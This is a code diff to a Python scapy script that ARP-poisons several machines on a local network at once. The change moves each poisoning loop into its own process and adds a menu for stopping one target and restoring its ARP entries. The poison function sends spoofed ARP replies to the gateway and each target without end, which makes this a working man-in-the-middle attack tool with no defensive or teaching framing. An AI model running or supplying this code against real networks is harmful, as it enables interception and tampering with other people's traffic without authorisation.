@@ -9,7 +9,7 @@
 # use threading to arp individual clients
 # and setup a shell so that when you send an id it stops certain arps
 import sys
-import threading
+import multiprocessing
 
 from scapy.all import *
 from termcolor import colored
@@ -31,13 +31,9 @@ def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
 
 def poison(gateway_ip, gateway_mac, target_ip, target_mac):
     while True:
-        try:
-            send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac))
-            send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=target_mac))
-            time.sleep(2)
-        except KeyboardInterrupt:
-            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
-            return
+        send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac))
+        send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=target_mac))
+        time.sleep(2)
 
 def get_mac(ip_address):
     responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2, retry=10)
@@ -98,12 +94,25 @@ class larp():
 
     def main(self):
         t_id = 0    # thread id
+        id_map = dict()
         print colored("[*] Main Thread", "green")
         for ip in self.t_ip:
-            self.thread_array.append(threading.Thread(target=poison, args=(self.g_ip, self.g_mac, ip, self.t_mac[ip])))
+            self.thread_array.append(multiprocessing.Process(target=poison,\
+            args=(self.g_ip, self.g_mac, ip, self.t_mac[ip])))
             self.thread_array[t_id].start()
             print colored("[^] ID: %d / Starting to ARP poison %s" % (t_id, ip), "blue")
+            id_map[t_id] = [ip, self.t_mac[ip] ]
             t_id += 1
+        print colored("[*] Main menu:\n[*] Enter the ID of the arp poison you want to kill", "green")
+        while len(id_map):
+            buf = raw_input('#>')
+            try:
+                self.thread_array[int(buf)].terminate()
+                restore_target(self.g_ip, self.g_mac, id_map[int(buf)][0], id_map[int(buf)][1])
+                print colored("[^] Restored: %s" % id_map[int(buf)][0], "blue")
+                del id_map[int(buf)]
+            except:
+                print colored("[!] You provided me wrong data", "red")
         for thread in self.thread_array:
             thread.join()
 
